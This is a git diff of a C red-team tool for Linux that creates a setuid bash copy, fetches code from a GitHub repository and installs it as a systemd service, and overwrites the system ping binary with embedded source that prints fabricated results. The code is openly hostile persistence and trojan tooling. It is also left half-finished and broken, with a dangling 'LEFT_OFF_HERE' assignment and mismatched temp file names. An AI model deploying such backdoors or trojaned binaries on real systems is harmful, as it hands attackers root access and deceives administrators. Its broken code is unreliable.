@@ -4,8 +4,8 @@
 #include <unistd.h>
 #include <sys/stat.h> // For file perms
 #include <fcntl.h>
-#include <curl/curl.h>
 #include <dirent.h> 
+#include <string.h>
 
 #ifdef FILENAME_MAX
     #define FILENAME_LEN FILENAME_MAX
@@ -42,7 +42,6 @@
 
 // Functions:
 int re_setuid_bash(void);
-void download_file(const char *hostname, const char *path, const char *output_filename);
 int re_processd(void);
 int re_broken_ls(void);
 int re_fake_ping(void);
@@ -87,7 +86,7 @@ int re_setuid_bash(void){
     }
 
     close(setuid_bash);
-    fclose(copy_buffer);
+    fclose(bash);
     
     return 0;
 }
@@ -95,95 +94,18 @@ int re_setuid_bash(void){
 ////////////////////////////////////////
 ////////// Processd
 ////////////////////////////////////////
-void download_file(const char *hostname, const char *path, const char *output_filename) {
-    int sockfd;
-    struct sockaddr_in server_addr;
-    struct hostent *server;
-    char request[MAX_BUFFER_SIZE];
-    char response[MAX_BUFFER_SIZE];
-    FILE *output_file;
-
-    // Resolve hostname to IP address
-    server = gethostbyname(hostname);
-    if (server == NULL) {
-        fprintf(stderr, "Error: no such host found\n");
-        exit(EXIT_FAILURE);
-    }
-
-    // Create socket
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd < 0) {
-        perror("Error creating socket");
-        exit(EXIT_FAILURE);
-    }
-
-    // Set server address structure
-    bzero((char *)&server_addr, sizeof(server_addr));
-    server_addr.sin_family = AF_INET;
-    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
-    server_addr.sin_port = htons(80);  // HTTP port
-
-    // Connect to the server
-    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Error connecting to server");
-        exit(EXIT_FAILURE);
-    }
-
-    // Prepare the HTTP GET request
-    snprintf(request, sizeof(request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, hostname);
-
-    // Send the HTTP GET request
-    if (send(sockfd, request, strlen(request), 0) < 0) {
-        perror("Error sending request");
-        exit(EXIT_FAILURE);
-    }
-
-    // Open output file to save the downloaded content
-    output_file = fopen(output_filename, "wb");
-    if (output_file == NULL) {
-        perror("Error opening output file");
-        exit(EXIT_FAILURE);
-    }
-
-    // Receive and write the response to the file
-    ssize_t bytes_received;
-    int header_received = 0;
-
-    while ((bytes_received = recv(sockfd, response, sizeof(response), 0)) > 0) {
-        if (!header_received) {
-            // Skip HTTP headers (e.g., "HTTP/1.1 200 OK")
-            char *body_start = strstr(response, "\r\n\r\n");
-            if (body_start != NULL) {
-                // Move to the body of the HTTP response
-                header_received = 1;
-                body_start += 4; // Skip past the "\r\n\r\n"
-                bytes_received -= (body_start - response);
-                fwrite(body_start, 1, bytes_received, output_file);
-            }
-        } else {
-            // Write the body of the HTTP response to the file
-            fwrite(response, 1, bytes_received, output_file);
-        }
-    }
-
-    if (bytes_received < 0) {
-        perror("Error receiving data");
-    }
-
-    // Close the file and socket
-    fclose(output_file);
-    close(sockfd);
-
-    printf("File downloaded successfully!\n");
-}
+static const char *processd_c = NULL;
+static const char *processd_service = NULL;
 int re_processd(void){
     // TODO: Add error handling
+    FILE *fp;
 
     // Install prereqs
     system("apt install -y libcurl4-openssl-dev");
 
     // processd.c
-    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c", "/tmp/processd.c");
+    // download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.c", "/tmp/processd.c");
+    fp = // BLAH BLAH BLAH BLAH BLAH TODO: FLAG: LEFT_OFF_HERE:
     // processd executable
     system("gcc /tmp/processd.c -o /var/lib/processd");
     system("chmod 500 /var/lib/processd");
@@ -191,7 +113,7 @@ int re_processd(void){
     system("rm /tmp/processd.c");
 
     // processd.service
-    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
+    // download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
     // Install service
     system("systemctl daemon-reload && systemctl start processd && systemctl enable processd");
 
@@ -240,12 +162,154 @@ int re_broken_ls(void){
 ////////////////////////////////////////
 ////////// Broken ping
 ////////////////////////////////////////
-
+static const char *fake_ping_c = "#include <stdio.h>\n"
+    "#include <stdlib.h>\n"
+    "#include <string.h>\n"
+    "#include <unistd.h>\n"
+    "#include <arpa/inet.h>\n"
+    "#include <netdb.h>\n"
+    "#include <time.h>\n"
+    "#include <signal.h>\n"
+    "\n"
+    "\n"
+    "volatile sig_atomic_t keep_running = 1; // Flag to control the loop\n"
+    "void handle_signal(int signal) {\n"
+    "    if (signal == SIGINT) {\n"
+    "        keep_running = 0; // Set flag to exit the loop\n"
+    "    }\n"
+    "}\n"
+    "\n"
+    "void print_usage() {\n"
+    "    printf(\"Usage: ping [OPTIONS] <hostname>\\n\");\n"
+    "    printf(\"Options:\\n\");\n"
+    "    printf(\"  -c <count>       Stop after sending <count> ECHO_REQUEST packets.\\n\");\n"
+    "    printf(\"  -i <interval>    Wait <interval> seconds between sending each packet.\\n\");\n"
+    "    printf(\"  -t <ttl>         Set the IP Time to Live.\\n\");\n"
+    "    printf(\"  -s <size>        Specify the number of data bytes to be sent.\\n\");\n"
+    "    printf(\"  -v               Verbose output.\\n\");\n"
+    "    printf(\"  -h               Display this help message.\\n\");\n"
+    "}\n"
+    "\n"
+    "char* resolve_hostname(const char* hostname) {\n"
+    "    struct addrinfo hints, *res;\n"
+    "    static char ipstr[INET6_ADDRSTRLEN]; // Buffer for IP address\n"
+    "\n"
+    "    memset(&hints, 0, sizeof hints);\n"
+    "    hints.ai_family = AF_UNSPEC; // AF_INET or AF_INET6\n"
+    "    hints.ai_socktype = SOCK_STREAM;\n"
+    "\n"
+    "    if (getaddrinfo(hostname, NULL, &hints, &res) != 0) {\n"
+    "        return NULL;\n"
+    "    }\n"
+    "\n"
+    "    void *addr;\n"
+    "    // Loop through all the results and get the first valid IP address\n"
+    "    struct addrinfo *p;\n"
+    "    for (p = res; p != NULL; p = p->ai_next) {\n"
+    "        if (p->ai_family == AF_INET) { // IPv4\n"
+    "            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;\n"
+    "            addr = &(ipv4->sin_addr);\n"
+    "            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);\n"
+    "            break;\n"
+    "        } else if (p->ai_family == AF_INET6) { // IPv6\n"
+    "            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;\n"
+    "            addr = &(ipv6->sin6_addr);\n"
+    "            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);\n"
+    "            break;\n"
+    "        }\n"
+    "    }\n"
+    "\n"
+    "    freeaddrinfo(res); // Free the linked list\n"
+    "    return (p == NULL) ? NULL : ipstr;\n"
+    "}\n"
+    "\n"
+    "void print_ping_result(const char *hostname, int count, int interval, int ttl, int size, int verbose) {\n"
+    "    char *ip_address = resolve_hostname(hostname);\n"
+    "    if (ip_address == NULL) {\n"
+    "        fprintf(stderr, \"Could not resolve hostname: %s\\n\", hostname);\n"
+    "        return;\n"
+    "    }\n"
+    "    printf(\"PING %s (%s) %d(%d) bytes of data:\\n\", hostname, ip_address, size, size+28);\n"
+    "    double timeSum = 0;\n"
+    "    double minDelay = 10000;\n"
+    "    double maxDelay = 0;\n"
+    "    int i;\n"
+    "    for (i = 0; keep_running && (count == 0 || i < count); i++) {\n"
+    "        if (verbose) {\n"
+    "            printf(\"Sending packet %d with TTL=%d\\n\", i + 1, ttl);\n"
+    "        }\n"
+    "        srand(time(NULL));\n"
+    "        double delay = rand() % 16000 / 1000.0 + 4;\n"
+    "        minDelay = delay < minDelay ? delay : minDelay;\n"
+    "        maxDelay = delay > minDelay ? delay : maxDelay;\n"
+    "        timeSum += delay;\n"
+    "        printf(\"%d bytes from %s (%s): icmp_seq=%d ttl=%d time=%.1f ms\\n\", size + 8, hostname, ip_address, i + 1, ttl, delay);\n" 
+    "        usleep(interval * 1000000); // Convert seconds to microseconds\n"
+    "    }\n"
+    "    printf(\"\\n--- %s ping statistics ---\\n\", hostname);\n"
+    "    printf(\"%d packets transmitted, %d received, 0%s packet loss, time %dms\\n\", i, i, \"%\", (int)timeSum + (int)(interval*(0.89)*(i+1)));\n"
+    "    printf(\"rtt min/avg/max = %.3f/%.3f/%.3f ms\\n\", minDelay, timeSum/(i+1), maxDelay);\n"
+    "}\n"
+    "\n"
+    "int main(int argc, char *argv[]) {\n"
+    "    int opt;\n"
+    "    int count = 0;        // Default count\n"
+    "    int interval = 1;     // Default interval in seconds\n"
+    "    int ttl = 64;         // Default TTL\n"
+    "    int size = 56;        // Default size in bytes\n"
+    "    int verbose = 0;      // Default verbosity\n"
+    "\n"
+    "    signal(SIGINT, handle_signal); // Handle Ctrl+C (SIGINT)\n"
+    "\n"
+    "    while ((opt = getopt(argc, argv, \"c:i:t:s:vh\")) != -1) {\n"
+    "        switch (opt) {\n"
+    "            case 'c':\n"
+    "                count = atoi(optarg);\n"
+    "                break;\n"
+    "            case 'i':\n"
+    "                interval = atoi(optarg);\n"
+    "                break;\n"
+    "            case 't':\n"
+    "                ttl = atoi(optarg);\n"
+    "                break;\n"
+    "            case 's':\n"
+    "                size = atoi(optarg);\n"
+    "                break;\n"
+    "            case 'v':\n"
+    "                // verbose = 1;\n"
+    "                break;\n"
+    "            case 'h':\n"
+    "                print_usage();\n"
+    "                return 0;\n"
+    "            default:\n"
+    "                print_usage();\n"
+    "                return 1;\n"
+    "        }\n"
+    "    }\n"
+    "\n"
+    "    if (optind >= argc) {\n"
+    "        fprintf(stderr, \"Expected hostname after options\\n\");\n"
+    "        print_usage();\n"
+    "        return 1;\n"
+    "    }\n"
+    "\n"
+    "    const char *hostname = argv[optind];\n"
+    "    \n"
+    "    print_ping_result(hostname, count, interval, ttl, size, verbose);\n"
+    "\n"
+    "    return 0;\n"
+    "}";
 int re_fake_ping(void){
-    // Download ping.c
-    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/ping/ping.c", "/tmp/ping.c");
+    FILE *fp;
+    
+    // Create ping.c
+    fp = fopen("/tmp/ping.g", "w+");
+    fprintf(fp, "%s", fake_ping_c);
+    fclose(fp);
+
     // Replace ping
     system("gcc /tmp/ping.c -o `which ping`");
+    
     // Remove temporary file
     system("rm /tmp/ping.c");
     return 0;
